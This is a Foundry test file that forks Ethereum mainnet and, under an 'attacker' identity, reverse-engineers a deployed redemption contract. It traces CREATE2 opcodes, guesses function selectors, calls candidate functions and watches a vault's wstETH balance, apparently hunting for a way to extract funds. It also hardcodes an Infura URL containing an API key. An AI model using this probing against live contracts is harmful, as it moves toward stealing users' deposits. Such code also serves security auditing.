// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract Create2CallerSalt is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeCreate2At4338() public view {
        console.log("=== ANALYZING CREATE2 AT 4338 (CALLER SALT) ===\n");

        bytes memory code = REDEMPTION_1.code;

        // CREATE2 at 4338, CALLER at 4334, SHA3 at 4319
        // This suggests: salt = keccak256(... CALLER ...)

        console.log("Full opcode trace 4250-4400:");

        uint i = 4250;
        while (i < 4400 && i < code.length) {
            uint8 op = uint8(code[i]);
            uint skipBytes = 0;

            if (op == 0x54) console.log(i, "SLOAD");
            if (op == 0x55) console.log(i, "SSTORE");
            if (op == 0xf1) console.log(i, "CALL");
            if (op == 0xf4) console.log(i, "DELEGATECALL");
            if (op == 0xf5) console.log(i, "CREATE2");
            if (op == 0x33) console.log(i, "CALLER");
            if (op == 0x20) console.log(i, "SHA3");
            if (op == 0x51) console.log(i, "MLOAD");
            if (op == 0x52) console.log(i, "MSTORE");

            if (op >= 0x60 && op <= 0x7f) {
                uint8 size = op - 0x5f;
                uint256 val = 0;
                for (uint j = 0; j < size && i + 1 + j < code.length; j++) {
                    val = val << 8 | uint8(code[i + 1 + j]);
                }
                if (size == 4) {
                    console.log(i, "PUSH4:");
                    console.logBytes4(bytes4(uint32(val)));
                } else if (size == 20 && val < type(uint160).max / 2) {
                    console.log(i, "PUSH20:");
                    console.log("  ", address(uint160(val)));
                } else if (val < 500) {
                    console.log(i, "PUSH:", val);
                }
                skipBytes = size;
            }

            i += 1 + skipBytes;
        }
    }

    function test_FindFunctionThatTriggersCreate2() public view {
        console.log("=== FINDING FUNCTION THAT TRIGGERS CREATE2 AT 4338 ===\n");

        bytes memory code = REDEMPTION_1.code;

        // Find which function selector leads to CREATE2 at 4338
        // Look for function dispatch (PUSH4 followed by EQ and JUMPI)

        console.log("Function selectors in REDEMPTION_1:");

        bytes4[] memory found = new bytes4[](30);
        uint count = 0;

        for (uint i = 0; i + 4 < code.length && count < 30; i++) {
            if (uint8(code[i]) == 0x63) {
                bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));

                // Check if followed by EQ
                bool isDispatch = false;
                for (uint j = i + 5; j < i + 15 && j < code.length; j++) {
                    if (uint8(code[j]) == 0x14) {
                        isDispatch = true;
                        break;
                    }
                }

                if (isDispatch && sel != bytes4(0) && sel != bytes4(0xffffffff) && uint32(sel) > 0x1000) {
                    bool unique = true;
                    for (uint k = 0; k < count; k++) {
                        if (found[k] == sel) unique = false;
                    }
                    if (unique) {
                        found[count] = sel;
                        count++;
                    }
                }
            }
        }

        for (uint i = 0; i < count; i++) {
            console.logBytes4(found[i]);
        }

        // Match known function signatures
        console.log("\nKnown matches:");
        bytes4 redeem = bytes4(keccak256("redeem(uint96)"));
        bytes4 finalizeRedeem = bytes4(keccak256("finalizeRedeem(uint256)"));
        bytes4 createProxy = bytes4(keccak256("createProxy()"));
        bytes4 deploy = bytes4(keccak256("deploy(address)"));
        bytes4 cloneProxy = bytes4(keccak256("cloneProxy(address)"));

        console.log("redeem(uint96):");
        console.logBytes4(redeem);
        console.log("finalizeRedeem(uint256):");
        console.logBytes4(finalizeRedeem);
        console.log("createProxy():");
        console.logBytes4(createProxy);
        console.log("deploy(address):");
        console.logBytes4(deploy);
        console.log("cloneProxy(address):");
        console.logBytes4(cloneProxy);
    }

    function test_TryTriggerCreate2() public {
        console.log("=== TRYING TO TRIGGER CREATE2 ===\n");

        deal(IAU, attacker, 100000e18);

        vm.startPrank(attacker);
        IERC20(IAU).approve(REDEMPTION_1, type(uint256).max);

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18, "wstETH");

        // Try calling functions that might trigger CREATE2
        console.log("\nTrying potential CREATE2 triggers:");

        // Try redeem
        (bool s1, bytes memory d1) = REDEMPTION_1.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(1000e18))
        );
        console.log("redeem(uint96):", s1);
        if (!s1 && d1.length >= 4) console.logBytes4(bytes4(d1));

        // Try createProxy
        (bool s2, bytes memory d2) = REDEMPTION_1.call(
            abi.encodeWithSignature("createProxy()")
        );
        console.log("createProxy():", s2);
        if (!s2 && d2.length >= 4) console.logBytes4(bytes4(d2));

        // Try deploy
        (bool s3, bytes memory d3) = REDEMPTION_1.call(
            abi.encodeWithSignature("deploy(address)", attacker)
        );
        console.log("deploy(address):", s3);
        if (!s3 && d3.length >= 4) console.logBytes4(bytes4(d3));

        // Try getProxy
        (bool s4, bytes memory d4) = REDEMPTION_1.call(
            abi.encodeWithSignature("getProxy(address)", attacker)
        );
        if (s4) {
            address proxy = abi.decode(d4, (address));
            console.log("getProxy(attacker):", proxy);
        }

        // Try proxy getter
        (bool s5, bytes memory d5) = REDEMPTION_1.staticcall(
            abi.encodeWithSignature("proxy(address)", attacker)
        );
        if (s5 && d5.length >= 32) {
            address proxy = abi.decode(d5, (address));
            console.log("proxy(attacker):", proxy);
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault change:", int256(vaultAfter) - int256(vaultBefore));
    }

    function test_ExamineCreate2At955() public view {
        console.log("=== ANALYZING CREATE2 AT 955 (SLOT 4) ===\n");

        bytes memory code = REDEMPTION_1.code;

        // CREATE2 at 955, SLOAD at 908
        console.log("Opcode trace 850-1000:");

        uint i = 850;
        while (i < 1000 && i < code.length) {
            uint8 op = uint8(code[i]);
            uint skipBytes = 0;

            if (op == 0x54) console.log(i, "SLOAD");
            if (op == 0x55) console.log(i, "SSTORE");
            if (op == 0xf1) console.log(i, "CALL");
            if (op == 0xf4) console.log(i, "DELEGATECALL");
            if (op == 0xf5) console.log(i, "CREATE2");
            if (op == 0x33) console.log(i, "CALLER");
            if (op == 0x20) console.log(i, "SHA3");

            if (op >= 0x60 && op <= 0x65) {
                uint8 size = op - 0x5f;
                uint256 val = 0;
                for (uint j = 0; j < size && i + 1 + j < code.length; j++) {
                    val = val << 8 | uint8(code[i + 1 + j]);
                }
                if (val < 100) {
                    console.log(i, "PUSH:", val);
                }
                skipBytes = size;
            }

            if (op >= 0x66 && op <= 0x7f) {
                uint8 size = op - 0x5f;
                skipBytes = size;
            }

            i += 1 + skipBytes;
        }
    }

    function test_PredictCreate2Address() public view {
        console.log("=== PREDICTING CREATE2 ADDRESSES ===\n");

        // If CREATE2 uses CALLER as salt, we can predict address
        // address = keccak256(0xff ++ deployer ++ salt ++ initCodeHash)[12:]

        // Try to find the init code hash
        // The CREATE2 at 4338 creates something with CALLER-based salt

        // Check what bytecode might be deployed
        // Minimal proxy pattern: 0x363d3d373d3d3d363d73<implementation>5af43d82803e903d91602b57fd5bf3

        bytes32 slot5 = vm.load(REDEMPTION_1, bytes32(uint256(5)));
        address impl = address(uint160(uint256(slot5)));
        console.log("Implementation (slot 5):", impl);

        // Common minimal proxy init code
        bytes memory proxyCode = abi.encodePacked(
            hex"3d602d80600a3d3981f3363d3d373d3d3d363d73",
            impl,
            hex"5af43d82803e903d91602b57fd5bf3"
        );

        bytes32 initCodeHash = keccak256(proxyCode);
        console.log("Minimal proxy init code hash:");
        console.logBytes32(initCodeHash);

        // Predict address for attacker
        bytes32 salt = keccak256(abi.encodePacked(attacker));
        address predicted = address(uint160(uint256(keccak256(abi.encodePacked(
            bytes1(0xff),
            REDEMPTION_1,
            salt,
            initCodeHash
        )))));

        console.log("\nPredicted proxy for attacker:", predicted);
        console.log("Has code:", predicted.code.length > 0);
    }
}
